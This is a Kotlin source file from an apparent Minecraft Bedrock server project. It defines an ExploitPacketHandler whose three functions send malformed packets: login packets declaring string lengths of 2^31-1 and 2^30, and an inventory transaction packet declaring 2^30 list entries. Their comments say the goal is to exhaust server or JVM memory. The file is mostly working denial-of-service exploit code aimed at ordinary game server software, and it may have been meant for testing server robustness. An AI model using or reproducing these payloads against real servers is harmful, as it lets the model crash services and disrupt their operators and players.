/*
 * MIT License
 *
 * Copyright (c) 2021, Valaphee.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

package com.valaphee.tesseract.dev

import com.valaphee.tesseract.inventory.InventoryTransactionPacket
import com.valaphee.tesseract.net.Connection
import com.valaphee.tesseract.net.Packet
import com.valaphee.tesseract.net.PacketBuffer
import com.valaphee.tesseract.net.PacketHandler
import com.valaphee.tesseract.net.UnknownPacket

/**
 * @author Kevin Ludwig
 */
class ExploitPacketHandler(
    private val connection: Connection
) : PacketHandler {
    override fun initialize() {
    }

    override fun other(packet: Packet) = Unit

    /**
     * Exhausts the memory by let it read a string with a length of 2^31 - 1. (LoginPacket)
     */
    private fun bdsMemoryExhaust() {
        connection.write(UnknownPacket(0x01, PacketBuffer(connection.context.alloc().buffer()).also {
            it.writeInt(connection.version)
            it.writeVarUInt(4)
            it.writeIntLE(Int.MAX_VALUE)
        }))
    }

    /**
     * Exhausts the jvm memory by let it read a string with a length of 2^30. (LoginPacket)
     */
    private fun jvmMemoryExhaust() {
        connection.write(UnknownPacket(0x01, PacketBuffer(connection.context.alloc().buffer()).also {
            it.writeInt(connection.version)
            it.writeVarUInt(4)
            it.writeIntLE(1 shl 30)
        }))
    }

    /**
     * Exhausts the jvm by let it read a list of 2^30 entries. (InventoryTransactionPacket)
     * Works only on instances which fully implement the protocol. (not Waterdog e.g.)
     */
    private fun jvmExhaust() {
        connection.write(UnknownPacket(0x1E, PacketBuffer(connection.context.alloc().buffer()).also {
            it.writeVarInt(0)
            it.writeVarUInt(InventoryTransactionPacket.Type.Normal.ordinal)
            it.writeVarUInt(1 shl 30)
        }))
    }
}
